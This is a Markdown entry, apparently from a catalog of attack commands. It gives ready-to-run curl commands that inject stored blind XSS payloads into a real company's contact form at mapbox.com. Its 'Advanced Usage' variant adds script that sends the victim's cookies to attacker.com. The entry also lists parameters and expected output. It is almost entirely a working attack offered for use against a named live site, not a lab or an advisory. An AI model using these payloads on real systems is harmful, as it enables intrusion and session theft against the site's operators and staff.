---
data: >-
  curl -X POST https://www.mapbox.com/contact -d "name=TestUser" -d
  "email=test@example.com" -d "message=<script>alert('XSS')</script>" -d
  "submit=Send"
tags:
  - xss
  - injection
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:23.560Z'
id: 8fdcb006-1188-4f0c-939a-9638b76a027c
verified: false
validated: true
submitted: true
---
# curl-submit-xss-payload

## Command

```bash
curl -X POST https://www.mapbox.com/contact -d "name=TestUser" -d "email=test@example.com" -d "message=<script>alert('XSS')</script>" -d "submit=Send"
```

## Description

This command uses curl to submit a POST request to a contact form endpoint, injecting a basic XSS payload into the message field to exploit stored blind XSS vulnerabilities. It simulates a legitimate form submission while delivering malicious JavaScript.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `https://www.mapbox.com/contact` | Target endpoint URL | Yes |
| `-d "name=TestUser"` | Form field for name | Yes |
| `-d "email=test@example.com"` | Form field for email | Yes |
| `-d "message=<script>alert('XSS')</script>"` | Form field for message with XSS payload | Yes |
| `-d "submit=Send"` | Submit button emulation | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.mapbox.com/contact -d "name=TestUser" -d "email=test@example.com" -d "message=<script>alert('XSS')</script>" -d "submit=Send"
```

### Advanced Usage

```bash
curl -X POST https://www.mapbox.com/contact -d "name=TestUser" -d "email=test@example.com" -d "message=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>" -d "submit=Send" -v
```

## Expected Output

HTTP response indicating successful submission, such as:

```
< HTTP/1.1 200 OK
< Content-Type: text/html
...
Thank you for your message.
```
No immediate XSS execution; payload stored for later admin viewing.

## Related

- [[Related Procedure|procedures/Inject-Stored-Blind-XSS-in-Contact-Form]]
